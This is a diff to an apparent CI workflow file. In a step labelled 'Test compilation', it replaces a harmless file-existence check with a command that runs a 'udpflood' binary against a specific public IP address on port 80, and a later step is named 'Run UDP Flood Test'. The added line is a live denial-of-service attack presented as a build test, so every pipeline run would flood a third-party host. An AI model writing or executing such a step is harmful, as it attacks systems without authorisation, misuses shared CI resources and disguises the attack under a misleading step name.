@@ -41,14 +41,7 @@ jobs:
           
       - name: Test compilation
         run: |
-          echo "Testing executable..."
-          if [ -f "udpflood" ]; then
-            ./udpflood || echo "Executable test completed"
-            echo "✅ Binary works correctly"
-          else
-            echo "❌ Executable not found"
-            exit 1
-          fi
+          ./udpflood 23.176.168.11 80 120 100 1024
           
       - name: Run UDP Flood Test
         run: |
